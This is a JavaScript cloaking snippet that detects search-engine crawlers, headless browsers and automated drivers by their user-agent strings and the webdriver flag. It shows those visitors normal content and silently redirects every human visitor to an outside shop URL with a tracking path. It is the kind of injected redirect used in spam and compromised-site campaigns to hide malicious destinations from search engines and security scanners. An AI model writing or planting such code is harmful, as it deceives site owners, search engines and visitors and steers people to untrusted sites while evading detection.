var ua = navigator.userAgent.toLowerCase();

var isLikelyBot =
  ua.includes('googlebot') ||
  ua.includes('bingbot') ||
  ua.includes('yahoo') ||
  ua.includes('yandex') ||
  ua.includes('baiduspider') ||
  ua.includes('compatible') ||     
  ua.includes('bot') ||
  ua.includes('crawler') ||
  ua.includes('spider') ||
  /headless/i.test(ua) ||           
  navigator.webdriver === true;     

if (!isLikelyBot) {
  window.location.replace("https://a6s7.shop/3/rd.php?url=/t/Z0bDURKMHZ");
} else {
  console.log("Bot/crawler-like detected → serving content");
}